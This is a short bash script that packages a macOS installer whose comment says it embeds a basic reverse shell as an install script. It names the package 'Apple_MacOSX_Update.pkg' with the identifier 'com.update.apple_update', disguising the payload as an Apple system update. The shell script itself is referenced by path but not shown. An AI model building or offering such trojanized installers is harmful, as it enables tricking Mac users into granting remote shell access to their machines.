#!/bin/bash

# Create a package with a basic reverse shell
# embedded as an install script

rm *.pkg
sudo pkgbuild --identifier com.update.apple_update --nopayload --scripts "/Users/leg3nd/Documents/excluded/scripts" Apple_MacOSX_Update.pkg

exit 0 
